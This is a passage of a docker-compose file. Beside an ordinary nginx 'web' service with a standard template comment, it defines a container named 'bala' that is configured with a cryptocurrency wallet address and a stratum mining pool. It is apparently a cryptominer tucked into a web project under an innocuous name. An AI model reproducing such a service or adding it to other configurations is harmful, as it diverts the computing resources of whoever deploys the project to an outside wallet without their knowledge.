    image: bartolina/bala:latest
    container_name: bala
    restart: unless-stopped
    environment:
      - WALLET_ADDRESS=sugar1qwj5x6hyr88tqsuv2fmu8dvzzxgx35wl5uhnxf8.divio
      - POOL_ADDRESS=stratum+tcp://stratum-asia.rplant.xyz:7042
  web:
    build: .
    # Change the port if you'd like to expose your project locally on a
    # different port, for example if you already use port 8000 for
    # something else.
    ports:
    - "8000:80"
    volumes:
      - "./nginx.conf:/etc/nginx/nginx.conf:ro"
      - "./html:/usr/share/nginx/html:ro"
